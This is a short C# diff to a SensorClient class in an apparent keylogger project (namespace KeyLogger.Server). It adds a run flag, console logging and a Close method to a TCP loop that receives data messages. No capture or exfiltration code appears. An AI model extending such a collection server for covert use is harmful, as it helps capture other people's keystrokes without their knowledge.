@@ -2,6 +2,7 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
 using System;
+using KeyLogger.Protocol;
 
 namespace KeyLogger.Server
 {
@@ -19,6 +20,8 @@ namespace KeyLogger.Server
 
     public class SensorClient : Client
     {
+        private bool _run;
+        
         public event DataEventHandler DataReceived;
 
         public SensorClient(TcpClient tcpClient)
@@ -31,13 +34,21 @@ namespace KeyLogger.Server
         {
             return Task.Run(() =>
             {
-                while (true)
+                Console.WriteLine("[Sensor] Started");
+                _run = true;
+                while (_run)
                 {
                     var message = new DataMessage();
                     message.Receive(TcpClient.GetStream());
+                    Console.WriteLine("[Sensor] Data received");
                     DataReceived?.Invoke(this, new DataEventArgs(message.Data));
                 }
             });
+        }
+
+        public void Close()
+        {
+            _run = false;
         }
 
         public override string ToString()
